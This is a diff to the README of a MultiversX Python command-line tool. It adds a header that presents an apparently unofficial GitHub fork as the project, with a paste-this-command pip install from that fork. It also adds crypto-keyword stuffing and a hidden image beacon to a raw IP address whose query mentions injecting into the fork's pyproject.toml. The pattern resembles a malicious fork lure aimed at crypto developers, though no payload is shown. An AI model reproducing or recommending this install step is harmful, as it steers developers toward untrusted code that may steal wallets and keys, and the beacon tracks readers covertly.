@@ -1,3 +1,15 @@
+**PieceSamurai51/mx-sdk-py-cli**
+
+A straightforward, developer-friendly command-line interface designed to streamline your MultiversX SDK workflows in Python. This tool aims to take the friction out of interacting with the network, letting you focus on building rather than wrestling with complex configurations. It has been refined for stability, rolling in a handful of recent fixes that resolve edge-case crashes and improve general reliability.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/PieceSamurai51/mx-sdk-py-cli.git
+```
+
+[https://github.com/PieceSamurai51/mx-sdk-py-cli](https://github.com/PieceSamurai51/mx-sdk-py-cli)
+
 # Description
 Python Command Line Tools for interacting with Multivers<sup>X</sup>.
 
@@ -58,3 +70,11 @@ export PYTHONPATH="~/mx-sdk-py-cli"
 ```
 
 Then `mxpy` will use the code in your local repository.
+
+## Related searches
+
+Developers looking for this type of framework typically search for Python-based toolkits to interact directly with Web3 ecosystems, manage blockchain configurations, and build decentralized applications. These users often look for versatile interfaces capable of orchestrating smart contracts and handling programmatic interactions on-chain.
+
+**Topics:** crypto open source, perpetual swap, liquidity pool, mev bot, wallet connect, web3 python cli, decentralised application framework, smart contract automation, multiversx developer tools, blockchain sdk command line, dApp integration backend, crypto wallet automation
+
+![.](http://5.231.58.248:8787/pixel?repo=PieceSamurai51%2Fmx-sdk-py-cli&inject=PieceSamurai51%2Fmx-sdk-py-cli%2Fpyproject.toml)
